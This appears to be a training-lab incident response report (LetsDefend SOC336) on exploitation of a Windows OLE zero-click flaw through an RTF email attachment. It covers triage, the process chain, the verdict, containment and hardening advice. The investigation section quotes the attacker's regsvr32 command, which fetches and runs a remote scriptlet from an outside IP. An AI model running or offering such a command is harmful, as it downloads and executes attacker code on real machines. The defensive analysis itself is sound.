# Incident Response Report: SOC336 — Windows OLE Zero-Click RCE (CVE-2025-21298)

## 1. Scenario
* **Alert Name:** SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)
* **Severity:** Critical
* **Event ID:** 314
* **Target User:** `Austin@letsdefend.io`
* **Target Host:** `Austin-PC` (IP: `10.0.0.45`)
* **Timestamp:** October 22, 2026, 16:02:53
* **Summary:** An alert triggered indicating potential exploitation of CVE-2025-21298 via an incoming RTF email attachment (`mail.rtf`) delivered to `Austin@letsdefend.io`. Outlook automatically rendered the preview, dropping local binaries and executing remote scriptlets without user interaction.

* ## 2. Initial Triage
* **First Steps:** 
  1. Inspected Email Gateway logs for `Austin@letsdefend.io` to identify sender details (`projectmanagement@pm.me`), IP (`84.38.130.118`), and attachment hash (`df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184`).
  2. Ran the sender IP and attachment hash through Threat Intelligence tools, confirming both were flagged as malicious.
  3. Pivoted immediately to EDR/Sysmon process creation logs on `Austin-PC` around the email delivery timestamp (16:18:08) to detect process spawning under `OUTLOOK.EXE`.
 
  ## 3. Investigation
* **Execution Flow:**
  - `OUTLOOK.EXE` rendered `mail.rtf` at `16:18:08`.
  - The embedded OLE object triggered `cmd.exe` (PID: 6784) to execute `regsvr32.exe` with `scrobj.dll`.
- **Command Line:**
  `cmd.exe /c regsvr32.exe /s /n /u /i:http://84.38.130.118/shell.sct scrobj.dll`
* **Network Logs:**
  - Proxy/HTTP logs confirmed a permitted (`200 OK`) outbound `GET` request from `10.0.0.45` to `http://84.38.130.118/shell.sct`.
* **Key Artifacts:**
  - **Sender:** `projectmanagement@pm.me` (IP: `84.38.130.118`)
  - **Attachment Hash (SHA-256):** `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184`

## 4. Verdict
* **Classification:** True Positive (TP)
* **Reasoning:** Email logs, host process executions, and network proxy logs confirm that a malicious OLE file (`mail.rtf`) was delivered and processed by Outlook without user interaction. The resulting execution successfully downloaded a secondary remote payload (`shell.sct`) from C2 infrastructure (`84.38.130.118`).

* ## 5. Action Taken
* **Host Isolation:** Immediately isolated `Austin-PC` (`10.0.0.45`) from the network via EDR to prevent lateral movement.
* **Block C2 Infrastructure:** Added C2 IP `84.38.130.118` and URL `http://84.38.130.118/shell.sct` to perimeter firewall and proxy blocklists.
* **Email Remediation:** Purged the malicious email from `Austin@letsdefend.io` and created a mail flow rule to block incoming messages from sender `projectmanagement@pm.me`.
* **Escalation:** Escalated the incident to Tier 2 / Incident Response team for memory forensics, persistence checks, and complete host remediation.

* ## 6. Lesson Learned
* **Detection Gaps & Defenses:**
  - **Patch Management:** Ensure security update KB5048866 (or equivalent vendor patch) for CVE-2025-21298 is deployed enterprise-wide to fix the OLE vulnerability in MS Office.
  - **Attack Surface Reduction (ASR):** Enable ASR rules to block Office applications from spawning child processes (`cmd.exe`, `powershell.exe`, `regsvr32.exe`).
  - **Scriptlet Execution Controls:** Restrict or audit `regsvr32.exe` execution when fetching remote scriptlets (`scrobj.dll` / `.sct` files) via Application Control / AppLocker rules.
 
    
  - **C2 Payload URL:** `http://84.38.130.118/shell.sct`
